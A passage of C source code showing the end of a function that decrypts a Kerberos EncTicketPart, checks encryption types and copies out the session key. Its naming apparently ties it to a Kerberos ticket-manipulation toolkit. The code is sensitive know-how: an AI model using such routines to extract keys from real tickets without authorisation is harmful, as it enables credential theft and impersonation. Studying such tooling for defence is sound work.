					RtlCopyMemory(key->keyvalue.value, encticketpart->key.keyvalue.value, key->keyvalue.length);
					status = TRUE;
				}
			}
			else PRINT_ERROR(L"Authenticator etype (0x%08x) is not the same as Key keytype (0x%08x)\n", ApReq->authenticator.etype, encticketpart->key.keytype);
			ossFreePDU(&kull_m_kerberos_asn1_world, EncTicketPart_PDU, encticketpart);
		}
		else PRINT_ERROR(L"Unable to decode EncTicketPart: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
		LocalFree(DecryptedEncTicketPart.value);
	}
	else PRINT_ERROR(L"Unable to decrypt EncTicketPart: %08x\n", ntStatus);
	return status;
}